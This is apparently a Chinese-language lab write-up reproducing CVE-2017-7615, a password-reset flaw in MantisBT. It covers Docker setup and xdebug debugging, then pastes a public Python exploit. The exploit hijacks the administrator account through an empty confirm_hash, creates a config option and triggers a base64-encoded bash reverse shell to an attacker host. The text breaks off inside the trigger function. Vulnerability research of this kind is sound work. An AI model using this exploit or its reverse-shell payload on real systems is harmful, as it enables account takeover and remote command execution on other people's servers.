## 概述
Mantis BT是一个BUG管理系统,用php编写，系统相对简单轻量级，开源。
CVE-2017-7615漏洞影响MantisBT2.3.0及之前的版本，攻击者可通过向verify.php文件传递空的`confirm_hash`值利用该漏洞重置任意密码，获取管理员访问权限。
## 环境搭建
启动一个docker
    sudo docker run -it --name Mantis -p 10080:80 --privileged=true -v /home/island/work/work/software/Mantis/container:/root ubuntu:16.04 bash
进入docker先安装最基础的一些工具
    apt-get update
    apt-get install net-tools 
    apt-get install iputils-ping
    apt-get install iproute2
    apt-get install vim
    apt-get install zip
安装Mantis
    apt-get install apache2
    apt-get install php
    apt-get install php7.0-gd (php用你的特定版本)
    apt-get install libapache2-mod-php
    apt-get install mysql-server
    apt-get install php-mysql
    apt-get install php-xml
    apt-get install php-mbstring
    service apache2 start
    service mysql start
从GitHub上可以下载到2.18.0的Mantis的安装包
    cp  mantisbt-2.18.0.zip  /var/www/html/
    cd  /var/www/html/
    unzip mantisbt-2.18.0.zip
    mv mantisbt-2.18.0 mantisbt
    chmod -R 777 mantisbt
修改配置文件，将/etc/php/7.0/apache2/php.ini其中`;extension=msql.so`前边的分号删除
修改文件/etc/apache2/apache2.conf，在最后加上一行`ServerName localhost:80`
在访问目标80端口时候发现不能正常访问，查看apache2日志
    root@21467ebf0ffb:/var/www/html/mantisbt# tail /var/log/apache2/error.log
    [Tue Jul 26 09:30:04.072922 2022] [:error] [pid 12525] [client 172.16.113.1:56529] PHP Warning:  require_once(/var/www/html/mantisbt/vendor/autoload.php): failed to open stream: No such file or directory in /var/www/html/mantisbt/core.php on line 91
    [Tue Jul 26 09:30:04.072952 2022] [:error] [pid 12525] [client 172.16.113.1:56529] PHP Fatal error:  require_once(): Failed opening required '/var/www/html/mantisbt/vendor/autoload.php' (include_path='.:/usr/share/php') in /var/www/html/mantisbt/core.php on line 91
    [Tue Jul 26 09:30:07.553159 2022] [:error] [pid 12533] [client 172.16.113.1:56558] PHP Warning:  require_once(/var/www/html/mantisbt/vendor/autoload.php): failed to open stream: No such file or directory in /var/www/html/mantisbt/core.php on line 91
    [Tue Jul 26 09:30:07.553188 2022] [:error] [pid 12533] [client 172.16.113.1:56558] PHP Fatal error:  require_once(): Failed opening required '/var/www/html/mantisbt/vendor/autoload.php' (include_path='.:/usr/share/php') in /var/www/html/mantisbt/core.php on line 91
    [Tue Jul 26 09:30:08.132794 2022] [:error] [pid 12526] [client 172.16.113.1:56559] PHP Warning:  require_once(/var/www/html/mantisbt/vendor/autoload.php): failed to open stream: No such file or directory in /var/www/html/mantisbt/core.php on line 91
    [Tue Jul 26 09:30:08.132822 2022] [:error] [pid 12526] [client 172.16.113.1:56559] PHP Fatal error:  require_once(): Failed opening required '/var/www/html/mantisbt/vendor/autoload.php' (include_path='.:/usr/share/php') in /var/www/html/mantisbt/core.php on line 91
    [Tue Jul 26 09:30:08.335108 2022] [:error] [pid 12527] [client 172.16.113.1:56560] PHP Warning:  require_once(/var/www/html/mantisbt/vendor/autoload.php): failed to open stream: No such file or directory in /var/www/html/mantisbt/core.php on line 91
    [Tue Jul 26 09:30:08.335137 2022] [:error] [pid 12527] [client 172.16.113.1:56560] PHP Fatal error:  require_once(): Failed opening required '/var/www/html/mantisbt/vendor/autoload.php' (include_path='.:/usr/share/php') in /var/www/html/mantisbt/core.php on line 91
    [Tue Jul 26 09:30:08.497536 2022] [:error] [pid 12528] [client 172.16.113.1:56561] PHP Warning:  require_once(/var/www/html/mantisbt/vendor/autoload.php): failed to open stream: No such file or directory in /var/www/html/mantisbt/core.php on line 91
    [Tue Jul 26 09:30:08.497565 2022] [:error] [pid 12528] [client 172.16.113.1:56561] PHP Fatal error:  require_once(): Failed opening required '/var/www/html/mantisbt/vendor/autoload.php' (include_path='.:/usr/share/php') in /var/www/html/mantisbt/core.php on line 91
查了一下，在mantisbt目录下执行以下命令配置一下环境，安装依赖：
    composer dump-autoload
    apt-get install php7.0-gd
    composer install
然后访问`http://172.16.113.160:10080/mantisbt/admin/install.php`页面进行傻瓜式安装
安装完成后访问
## 调试环境搭建
这个洞和我安装的版本不太适配，为了进行调试，同样的方法下载安装mantisBT
2.2.2,下载github里面的发现有点问题，建议可以去
下载解压完成后放在web目录下安装
    cp -r /root/mantisbt-2.2.2/ /var/www/html/
    chmod -R 777 mantisbt-2.2.2/
另外为了方便调试，利用vscode+xdebug实现php的远程调试，记录一下配置记录
### 服务器端配置
    apt install php-xdebug
然后通过命令`php --ini |
more`可以知道php.ini文件的位置在`/etc/php/7.0/cli/php.ini`，打开在末尾增加以下内容
    [xdebug]
    zend_extension=xdebug.so
    [XDebug]
    xdebug.remote_enable = on
    xdebug.remote_autostart = 1
    xdebug.remote_host = 172.16.113.1
    xdebug.remote_port = 9000
    xdebug.remote_connect_back = 0
    xdebug.auto_trace = 1
    xdebug.collect_includes = 1
    xdebug.collect_params = 1
    xdebug.remote_log = /tmp/xdebug.log
### 主机端配置
我的主机IDE端是Mac+VScode
Mac自带php，且php自带xdebug组件不用重复安装
直接打开VScode,打开调试界面，会自动添加launch.json,编辑加入以下内容
    {
        // Use IntelliSense to learn about possible attributes.
        // Hover to view descriptions of existing attributes.
        // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387
        "version": "0.2.0",
        "configurations": [
            {
                "name": "Listen for XDebug",
                "type": "php",
                "request": "launch",
                "stopOnEntry":false,
                "localSourceRoot": "/Users/islandmac/Seafile/MyDocument/work/software/Mantis/container/mantisbt-2.2.2/",
                "serverSourceRoot": "/var/www/html/mantisbt-2.2.2/",
                "port": 9000
            },
            {
                "name": "Launch currently open script",
                "type": "php",
                "request": "launch",
                "program": "${file}",
                "cwd": "${fileDirname}",
                "port": 9000
            }
        ]
    }
### 调试环境测试
至此，调试环境搭建完成，在verify.php头部下一个断点
尝试访问，发现果然断下来了，证明调试环境搭建成功
## 漏洞复现
[exp](https://disk.scan.cm/All_wiki/yougar0.github.io%28%E5%9F%BA%E4%BA%8E%E9%9B%B6%E7%BB%84%E5%85%AC%E5%BC%80%E6%BC%8F%E6%B4%9E%E5%BA%93%20%2B%20PeiQi%E6%96%87%E5%BA%93%E7%9A%84%E4%B8%80%E4%BA%9B%E6%BC%8F%E6%B4%9E%29-20210715/Web%E5%AE%89%E5%85%A8/MantisBT/%EF%BC%88CVE-2017-7615%EF%BC%89MantisBT%20%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E.md?hash=zE0KEPGJ)已经有大佬在网上放出来了
    import requests
    from urllib import quote_plus
    from base64 import b64encode
    from re import split
    class exploit():
        def __init__(self):
            self.s = requests.Session()
            self.headers = dict()  # Initialize the headers dictionary
            self.RHOST = "192.168.1.10"  # Victim IP
            self.RPORT = "10080"  # Victim port
            self.LHOST = "192.168.1.10"  # Attacker IP
            self.LPORT = "4444"  # Attacker Port
            self.verify_user_id = "1"  # User id for the target account
            self.realname = "administrator"  # Username to hijack
            self.passwd = "password"  # New password after account hijack
            self.mantisLoc = "/mantisbt-2.2.2"  # Location of mantis in URL
            self.ReverseShell = "echo " + b64encode(
                "bash -i >& /dev/tcp/" + self.LHOST + "/" + self.LPORT + " 0>&1") + " | base64 -d | /bin/bash"  # Reverse shell payload
        def reset_login(self):
            # Request # 1: Grab the account update token
            url = 'http://' + self.RHOST + ":" + self.RPORT + self.mantisLoc + '/verify.php?id=' + self.verify_user_id + '&confirm_hash='
            r = self.s.get(url=url, headers=self.headers)
            if r.status_code == 404:
                print "ERROR: Unable to access password reset page"
                exit()
            account_update_token = r.text.split('name="account_update_token" value=')[1].split('"')[1]
            # Request # 2: Reset the account password
            url = 'http://' + self.RHOST + ":" + self.RPORT + self.mantisLoc + '/account_update.php'
            data = "account_update_token=" + account_update_token + "&password=" + self.passwd + "&verify_user_id=" + self.verify_user_id + "&realname=" + self.realname + "&password_confirm=" + self.passwd
            self.headers.update({'Content-Type': 'application/x-www-form-urlencoded'})
            r = self.s.post(url=url, headers=self.headers, data=data)
            if r.status_code == 200:
                print "Successfully hijacked account!"
        def login(self):
            data = "return=index.php&username=" + self.realname + "&password=" + self.passwd + "&secure_session=on"
            url = 'http://' + self.RHOST + ":" + self.RPORT + self.mantisLoc + '/login.php'
            r = self.s.post(url=url, headers=self.headers, data=data)
            if "login_page.php" not in r.url:
                print "Successfully logged in!"
        def CreateConfigOption(self, option, value):
            # Get adm_config_set_token
            url = 'http://' + self.RHOST + ":" + self.RPORT + self.mantisLoc + '/adm_config_report.php'
            r = self.s.get(url=url, headers=self.headers)
            adm_config_set_token = r.text.split('name="adm_config_set_token" value=')[1].split('"')[1]
            # Create config
            data = "adm_config_set_token=" + adm_config_set_token + "&user_id=0&original_user_id=0&project_id=0&original_project_id=0&config_option=" + option + "&original_config_option=&type=0&value=" + quote_plus(
                value) + "&action=create&config_set=Create+Configuration+Option"
            url = 'http://' + self.RHOST + ":" + self.RPORT + self.mantisLoc + '/adm_config_set.php'
            r = self.s.post(url=url, headers=self.headers, data=data)
        def TriggerExploit(self):
            print "Triggering reverse shell"
            url = 'http://' + self.RHOST + ":" + self.RPORT + self.mantisLoc + '/workflow_graph_img.php'
            try:
                r = self.s.get(url=url, headers=self.headers, timeout=3)
            except: